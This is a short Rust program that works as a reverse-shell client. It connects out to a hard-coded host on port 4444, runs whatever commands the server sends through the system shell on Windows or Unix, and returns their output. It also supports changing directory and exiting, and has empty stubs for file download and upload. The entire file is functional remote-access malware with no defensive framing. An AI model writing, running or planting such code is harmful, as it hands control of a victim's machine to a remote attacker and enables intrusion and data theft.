use std::env;
use std::io;
use std::path::Path;
use std::process::Command;
use std::str;

use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream};
use std::str::from_utf8;
fn main() {
    match TcpStream::connect("vader.csh.rit.edu:4444") {
        Ok(mut stream) => {
            println!("Successfully connected to server in port 4444");
            loop {
                let mut data = [0 as u8; 1024];
                match stream.read(&mut data) {
                    Ok(size) => {
                        let str_data = from_utf8(&data[..size]).unwrap();
                        if cmd(str_data, &mut stream) {
                            break;
                        }
                    }
                    Err(e) => {
                        println!("Failed to receive data: {}", e);
                    }
                }
            }
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
}

fn cmd(cmd: &str, stream: &mut TcpStream) -> bool {
    if cmd.eq("exit") {
        stream.write("OK".as_bytes()).unwrap();
        stream.shutdown(Shutdown::Both).unwrap();
        return true;
    }
    if cmd[..=1].eq("cd") {
        let path = Path::new(&cmd[3..]);
        stream
            .write(
                match env::set_current_dir(path) {
                    Ok(_) => {
                        let cmd_out = if cfg!(windows) {
                            Command::new("CMD").arg("/C").arg("cd").output().unwrap()
                        } else {
                            Command::new("sh").arg("-c").arg("pwd").output().unwrap()
                        };
                        format!("{}", str::from_utf8(&cmd_out.stdout).unwrap())
                    }
                    Err(err) => {
                        format!("{}", err)
                    }
                }
                .as_bytes(),
            )
            .unwrap();
    } else if cmd[..=1].eq("DL") {
        
    } else if cmd[..=1].eq("UP") {

    } else {
        let cmd_out = if cfg!(windows) {
            Command::new("CMD").arg("/C").arg(&cmd).output().unwrap()
        } else {
            Command::new("sh").arg("-c").arg(&cmd).output().unwrap()
        };
        let out_str = str::from_utf8(&cmd_out.stdout).unwrap();
        let err_str = str::from_utf8(&cmd_out.stderr).unwrap();
        stream
            .write(format!("{}{}", out_str, err_str).as_bytes())
            .unwrap();
    }
    false
}
